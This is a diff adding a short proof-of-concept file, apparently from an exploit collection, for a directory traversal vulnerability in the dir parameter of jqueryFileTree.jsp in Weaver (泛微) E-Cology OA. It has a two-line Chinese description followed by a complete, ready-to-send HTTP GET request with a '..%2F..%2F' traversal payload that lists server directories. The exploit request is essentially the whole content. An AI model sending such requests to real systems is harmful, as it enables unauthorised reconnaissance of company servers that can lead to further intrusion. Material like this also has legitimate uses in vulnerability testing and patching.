@@ -1,0 +1,9 @@
+# 泛微OA E-Cology jqueryFileTree.jsp 目录遍历漏洞
+# 泛微e-cology是专为大中型企业制作的OA办公系统,支持PC端、移动端和微信端同时办公等，其中 jqueryFileTree.jsp 文件中 dir 参数存在目录遍历漏洞，攻击者通过漏洞可以获取服务器文件目录信息
+GET /hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?acid=80002138&dir=%2Fpage%2Fresource%2Fuserfile%2F..%2F..%2F&bid=hd_tag_m8mv257d HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv257d
+RM-PRO-Token: b7cd0f62c29684b27d1020e7ecc5eb94
+RM-PRO-Time: 1742808447319
+User-Agent: curl/7.83.1
+
